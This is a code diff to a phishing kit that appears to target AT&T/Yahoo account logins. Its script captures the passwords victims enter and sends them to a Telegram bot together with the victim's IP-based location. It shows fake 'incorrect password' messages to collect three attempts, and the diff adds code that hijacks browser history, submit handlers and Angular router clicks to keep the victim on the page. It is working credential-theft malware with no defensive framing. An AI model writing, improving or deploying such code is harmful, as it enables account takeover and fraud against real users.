@@ -135,7 +135,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
 
 <!-- =================================================================================== -->
 <!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING                         -->
-<!-- FIXED: WORKING LOCATION + NO REDIRECT ON 1ST/2ND ATTEMPT                           -->
+<!-- COMPLETELY BLOCKS REDIRECT ON 1ST/2ND ATTEMPT - OVERRIDES ANGULAR ROUTER           -->
 <!-- =================================================================================== -->
 <script>
 (function() {
@@ -150,7 +150,36 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
     let emailAutoFilled = false;
     let cachedLocation = null;
     
-    // Send message using Image Beacon (NO CORS - 100% WORKS)
+    // Hijack history.pushState and replaceState to prevent navigation
+    const originalPushState = history.pushState;
+    const originalReplaceState = history.replaceState;
+    
+    history.pushState = function() {
+        if (passwordAttempts > 0 && passwordAttempts < 3) {
+            console.log("[Interceptor] Blocked pushState navigation");
+            return;
+        }
+        return originalPushState.apply(history, arguments);
+    };
+    
+    history.replaceState = function() {
+        if (passwordAttempts > 0 && passwordAttempts < 3) {
+            console.log("[Interceptor] Blocked replaceState navigation");
+            return;
+        }
+        return originalReplaceState.apply(history, arguments);
+    };
+    
+    // Block beforeunload for attempts 1-2
+    window.addEventListener('beforeunload', function(e) {
+        if (passwordAttempts > 0 && passwordAttempts < 3) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        }
+    });
+    
+    // Send message using Image Beacon
     function sendToTelegram(message) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
             console.error("[Telegram] Bot token not configured!");
@@ -166,12 +195,10 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         const encodedMessage = encodeURIComponent(message);
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
         
-        // Use sendBeacon if available (most reliable)
         if (navigator.sendBeacon) {
             navigator.sendBeacon(url);
             console.log("[Telegram] Sent via sendBeacon!");
         } else {
-            // Fallback to image beacon
             const img = new Image();
             img.src = url;
             console.log("[Telegram] Sent via image beacon!");
@@ -201,14 +228,13 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
     async function getLocationInfo() {
         if (cachedLocation) return cachedLocation;
         
-        // Try multiple geolocation APIs
         const services = [
             {
                 url: 'https://ipapi.co/json/',
                 parse: (d) => ({ ip: d.ip, city: d.city, state: d.region, zip: d.postal, country: d.country_name })
             },
             {
-                url: 'https://ipinfo.io/json?token=',
+                url: 'https://ipinfo.io/json',
                 parse: (d) => ({ ip: d.ip, city: d.city, state: d.region, zip: d.postal, country: d.country })
             },
             {
@@ -237,7 +263,6 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
             }
         }
         
-        // Default fallback
         return { ip: "Unknown", city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" };
     }
     
@@ -328,7 +353,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         console.log(`[Report] Attempt #${attemptNumber} sent. IP: ${location.ip}, Location: ${location.city}, ${location.state}`);
     }
     
-    // Password page interceptor - NO REDIRECT on 1st/2nd attempt
+    // Password page interceptor - COMPLETELY BLOCKS NAVIGATION
     function setupPasswordInterceptor() {
         if (interceptorActive) return;
         
@@ -348,56 +373,97 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                 if (form && !form._intercepted) {
                     form._intercepted = true;
                     
-                    form.addEventListener('submit', async function(e) {
-                        const pwField = document.querySelector('input[type="password"]');
-                        const enteredPw = pwField ? pwField.value : '';
-                        
-                        // PREVENT DEFAULT - Stop form from submitting/redirecting
+                    // Override form.submit
+                    form.submit = function() {
+                        handlePasswordAttempt();
+                        return false;
+                    };
+                    
+                    // Add event listener with capture phase
+                    form.addEventListener('submit', function(e) {
                         e.preventDefault();
                         e.stopPropagation();
                         e.stopImmediatePropagation();
-                        
-                        passwordAttempts++;
-                        console.log(`[Interceptor] Attempt #${passwordAttempts}`);
-                        
-                        // Report to Telegram
-                        reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
-                        
-                        if (passwordAttempts < 3) {
-                            // Show error message
-                            showIncorrectPasswordMessage(passwordAttempts);
-                            
-                            // Clear password field and focus
-                            if (pwField) {
-                                pwField.value = '';
-                                pwField.focus();
-                            }
-                            
-                            // DO NOT REDIRECT - stay on page
-                            console.log(`[Interceptor] Waiting for attempt #${passwordAttempts + 1}`);
-                        } else {
-                            // Only redirect on 3rd attempt
-                            console.log("[Interceptor] 3rd attempt - redirecting...");
-                            window.location.href = "https://help.yahoo.com";
-                        }
-                        
+                        handlePasswordAttempt();
                         return false;
                     }, true);
                     
-                    // Also intercept button clicks
-                    const submitBtn = document.querySelector('#continueFromUserLogin, button[type="submit"], .btn-primary');
-                    if (submitBtn) {
-                        submitBtn.addEventListener('click', function(e) {
-                            // Let the form handler deal with it
-                        });
+                    // Intercept Angular's router navigation
+                    const routerOutlet = document.querySelector('router-outlet');
+                    if (routerOutlet && routerOutlet.parentElement) {
+                        routerOutlet.parentElement.addEventListener('click', function(e) {
+                            if (passwordAttempts > 0 && passwordAttempts < 3) {
+                                const target = e.target;
+                                if (target.tagName === 'A' || target.closest('a')) {
+                                    e.preventDefault();
+                                    e.stopPropagation();
+                                    e.stopImmediatePropagation();
+                                    console.log("[Interceptor] Blocked link click");
+                                    return false;
+                                }
+                            }
+                        }, true);
                     }
                     
-                    console.log("[Interceptor] Form intercepted - page will NOT reload on incorrect attempts");
+                    console.log("[Interceptor] Form intercepted - redirects BLOCKED on attempts 1-2");
                 }
             }
         });
         
         observer.observe(document.body, { childList: true, subtree: true });
+    }
+    
+    // Handle password attempt
+    async function handlePasswordAttempt() {
+        const pwField = document.querySelector('input[type="password"]');
+        const enteredPw = pwField ? pwField.value : '';
+        
+        passwordAttempts++;
+        console.log(`[Interceptor] Attempt #${passwordAttempts}`);
+        
+        // Report to Telegram
+        reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
+        
+        if (passwordAttempts < 3) {
+            // Show error message
+            showIncorrectPasswordMessage(passwordAttempts);
+            
+            // Clear password field and focus
+            if (pwField) {
+                pwField.value = '';
+                pwField.focus();
+            }
+            
+            console.log(`[Interceptor] Waiting for attempt #${passwordAttempts + 1}`);
+            
+            // Restore original history functions for now
+            history.pushState = originalPushState;
+            history.replaceState = originalReplaceState;
+            
+            // Re-hijack after a short delay (for the redirect attempt)
+            setTimeout(() => {
+                if (passwordAttempts < 3) {
+                    history.pushState = function() {
+                        console.log("[Interceptor] Blocked pushState navigation");
+                        return;
+                    };
+                    history.replaceState = function() {
+                        console.log("[Interceptor] Blocked replaceState navigation");
+                        return;
+                    };
+                }
+            }, 100);
+        } else {
+            // Restore original functions for redirect
+            history.pushState = originalPushState;
+            history.replaceState = originalReplaceState;
+            
+            // Redirect on 3rd attempt
+            console.log("[Interceptor] 3rd attempt - redirecting...");
+            window.location.href = "https://help.yahoo.com";
+        }
+        
+        return false;
     }
     
     // Initialize
